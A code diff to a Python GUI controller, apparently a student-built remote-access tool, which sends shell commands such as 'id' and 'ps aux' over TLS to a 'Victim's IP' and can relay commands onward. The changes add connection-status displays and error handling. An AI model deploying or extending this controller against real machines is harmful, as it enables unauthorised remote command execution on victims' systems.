@@ -3,6 +3,8 @@ import ssl
 import PySimpleGUI as sg
 import sys
 
+global check_error                                                                         # Define a global vvvvariable to check for errors
+check_error = False
 def menu(cert ,host ,port):
     """
         Description:
@@ -17,9 +19,9 @@ def menu(cert ,host ,port):
             port  -- The port to bind with
             
     """
-
-    layout = [[sg.Text('Not Setup', background_color='red',key='-OUT-')],                   #Menu layout with;connected ,Setup ,Enumeration ,Live Commands and Relay check boxes 
-             [sg.Checkbox('Setup', size=(100,1))],                                          #with ok and quit button
+    setup_value=False
+    layout = [[sg.Text('Not Setup', background_color='red',key='-OUT-')],                   # Menu layout with;connected ,Setup ,Enumeration ,Live Commands and Relay check boxes 
+             [sg.Checkbox('Setup', size=(100,1))],                                          # with ok and quit button
              [sg.Checkbox('Enumeration')],
              [sg.Checkbox('Live Commands')],
              [sg.Checkbox('Relay Commands')],
@@ -34,11 +36,12 @@ def menu(cert ,host ,port):
        
         if event == sg.WINDOW_CLOSED or event == 'Quit':                                    # See if user wants to quit or window was closed then break out of the program
             break
-        elif (values[0]==True):                                                             # If setup has been checked call the setup function to get the values host and port
+        elif ((values[0]==True) and (setup_value==False)):                                  # If setup has been checked call the setup function to get the values host and port
+            setup_value=True
             options=setup()
             host=options[0]
             port=options[1]
-            window['-OUT-'].update('all setup:ip:'+str(host)+' and port:'+str(port), background_color='green')  # Update the connection text to green and the port/IP selected 
+            window['-OUT-'].update('all setup-  ip:'+str(host)+' and port:'+str(port), background_color='green')  # Update the connection text to green and the port/IP selected 
             window.refresh()                                                                #Update the window
         elif (values[0]==False):
             window['-OUT-'].update('Not Setup', background_color='red')                     # Update the connection text to red and text to not setup
@@ -69,8 +72,8 @@ def interact_built(cert ,host ,port):
             
     """
     sg.theme('DarkGrey14')                                                                 # Set the theme of the menu
-    
-    layout = [[sg.Text('Script/Commands to execute', size=(40, 1))],                       # Sets the layout of the built in commands; ID, Process, Programs and OS Type
+    layout = [[sg.Text('', background_color='red',key='-OUT-')],
+             [sg.Text('Script/Commands to execute', size=(40, 1))],                       # Sets the layout of the built in commands; ID, Process, Programs and OS Type
              [sg.Button('ID')],                                                            # with the an ok and wuit button
              [sg.Button('Processes')],
              [sg.Button('Programs')],
@@ -87,7 +90,13 @@ def interact_built(cert ,host ,port):
 
         if event == sg.WINDOW_CLOSED or event == 'Quit':                                   # See if user wants to quit or window was closed then break out of the program
             break
-        elif (event=='ID'):
+        elif (check_error==True):
+            window['-OUT-'].update('Connected', background_color='green')                  # Update the connection text to green and text to connected
+            window.refresh()
+        elif (check_error==False):
+            window['-OUT-'].update('Not Connected', background_color='red')                # Update the connection text to red and text to not connected
+            window.refresh()      
+        if (event=='ID'):
             interact(cert, host, port, 'id')                                               # Sends standard linux commands to the intteract function 
         elif (event=='Processes'):
             interact(cert, host, port, 'ps aux')
@@ -113,7 +122,7 @@ def interact_GUI(cert ,host ,port):
     """
     sg.theme('DarkGrey14')                                                                 #Set the theme of the menu
 
-    layout = [                                                                             #Sets the layout with two inputs for the port to relay and ip with the command to send
+    layout = [[sg.Text('', background_color='red',key='-OUT-')],                  #Sets the layout with two inputs for the port to relay and ip with the command to send
         [sg.Text('Script/Commands to execute (for relay "relay ip port command")', size=(40, 1))],
         [sg.Output(size=(88, 20), font='Courier 10')],
         [sg.Button('Quit')],
@@ -127,7 +136,14 @@ def interact_GUI(cert ,host ,port):
         event, values = window.read()
         if event == sg.WINDOW_CLOSED or event == 'Quit':                                   # See if user wants to quit or window was closed then break out of the program
             break
-        elif event == 'Run':                                                               #Takes in the commands seperated by  a " " and joins them together finally passing 
+        elif (check_error==True):
+            window['-OUT-'].update('Connected', background_color='green')                  # Update the connection text to green and text to connected
+            window.refresh()
+        elif (check_error==False):
+            window['-OUT-'].update('Not Connected', background_color='red')                # Update the connection text to red and text to not connected
+            window.refresh()   
+        if event == 'Run':              
+                                                               #Takes in the commands seperated by  a " " and joins them together finally passing 
             args = values['-IN-'].split(' ')                                               #it to the interact function
             print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')
             create_argument=(args[0], *args[1:])
@@ -149,7 +165,7 @@ def Relay_GUI(cert ,host ,port):
     """
     sg.theme('DarkGrey14')                                                      #Set the theme of the menu
 
-    layout = [
+    layout = [[sg.Text('', background_color='red',key='-OUT-')],
         [sg.Text('Relay commands to be executed', size=(40, 1))],               #Sets the layout of relay menu with 3 input boxes for the IP, port and command to send
         [sg.Output(size=(88, 20), font='Courier 10')],
         [sg.Text('Relay IP', size=(15, 1)), sg.InputText()],
@@ -164,9 +180,15 @@ def Relay_GUI(cert ,host ,port):
 
     while True:                                                                 # Loop taking in user input and using it to call scripts
         event, values = window.read()
-        if event == sg.WINDOW_CLOSED or event == 'Quit':                        # See if user wants to quit or window was closed then break out of the program
+        if event == sg.WINDOW_CLOSED or event == 'Quit':                                   # See if user wants to quit or window was closed then break out of the program
             break
-        elif event == 'Run':                                                    #Takes in the commands seperated by  a " " and joins them together and creates an 
+        elif (check_error==True):
+            window['-OUT-'].update('Connected', background_color='green')                  # Update the connection text to green and text to connected
+            window.refresh()
+        elif (check_error==False):
+            window['-OUT-'].update('Not Connected', background_color='red')                # Update the connection text to red and text to not connected
+            window.refresh()   
+        if event == 'Run':                                                    #Takes in the commands seperated by  a " " and joins them together and creates an 
             args = values['-IN-'].split(' ')                                    # Argument that send the command in a relay format so the controller uunderstands. 
             print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')        
             create_argument=(args[0], *args[1:])
@@ -177,7 +199,7 @@ def setup():
     sg.theme('Topanga')                                                         # Sets the theme
 
 
-    layout = [                                                                  #Sets the layout for setup with 2 inputs for the port and IP address with an ok and quit button
+    layout = [      #Sets the layout for setup with 2 inputs for the port and IP address with an ok and quit button
         [sg.Text('Please enter your Victims IP and port to run')],
         [sg.Text('Vicims IP', size=(15, 1)), sg.InputText()],
         [sg.Text('Port', size=(15, 1)), sg.InputText()],
@@ -207,6 +229,7 @@ def interact(cert,host ,port ,data="id"):
             data  -- Command to send
             
     """
+    global check_error
     context = ssl.SSLContext()                                                         #Managers the SSL settings
     context.verify_mode = ssl.CERT_REQUIRED
     context.load_verify_locations(cert)                                                #Loads the certification file and Key to allow back to back encyption
@@ -214,18 +237,27 @@ def interact(cert,host ,port ,data="id"):
         ssock=context.wrap_socket(sock, server_hostname=host)                          #Create secure socket and print the vesision and certificate 
         print(ssock.version())
         print(ssock.getpeercert())
-        ssock.send(data.encode())                                                      #Sends the command encoded then splits it back up to check for relay 
-        command_split=data.split(" ")
-        if (command_split[0]=="relay"): 
-            print ("relayed")
-        else:
-            while 1:                                                                   #Creates a continuel loop that looks for data to be recieved 
-                recieve = ssock.recv(1024)
-                if (recieve  !=0):
-                    break
-                print(f"Recieved: {recieve}")
-            print(f"Recieved: {recieve}")
-            ssock.shutdown(2)                                                          #Nicely close the encrypted channel
+        try:
+            ssock.send(data.encode())                                                  #Sends the command encoded then splits it back up to check for relay 
+            check_error=True
+            command_split=data.split(" ")
+            if (command_split[0]=="relay"): 
+                print ("relayed")
+            else:
+                while 1:                                                              #Creates a continuel loop that looks for data to be recieved 
+                    recieve = ssock.recv(1024)
+                    if (recieve  !=0):
+                        break
+                    print(f"Recieved: {recieve}")
+                if (recieve==b"error with the command"):
+                    check_error=False
+                    ssock.shutdown(2)
+                else:
+                    print(f"Recieved: {recieve}")
+                    ssock.shutdown(2)                                                     #Nicely close the encrypted channel
+        except:
+            check_error=False
+            ssock.shutdown(2) 
 def get_host_info():
     """
         Description:
@@ -248,7 +280,7 @@ if __name__=="__main__":
     cert="./cert.pem"
     key="./key.pem"
     host=get_host_info()                                                               #Retrives the IP from the function get_host_info 
-    print(len(sys.argv))                                                               #Allow arguments to be passed such as h for help and u, p and c sending commadns to a 
+                                                                                       #Allow arguments to be passed such as h for help and u, p and c sending commadns to a 
     if ((len(sys.argv))>=2):                                                           #controller
         if (sys.argv[1]=="h"):
             print("""
@@ -279,4 +311,4 @@ if __name__=="__main__":
             command = -c
     """)
     else:
-        menu(cert ,key, host ,port)                                                     #Calls tthe menu
+        menu(cert ,host ,port)                                                     #Calls the menu
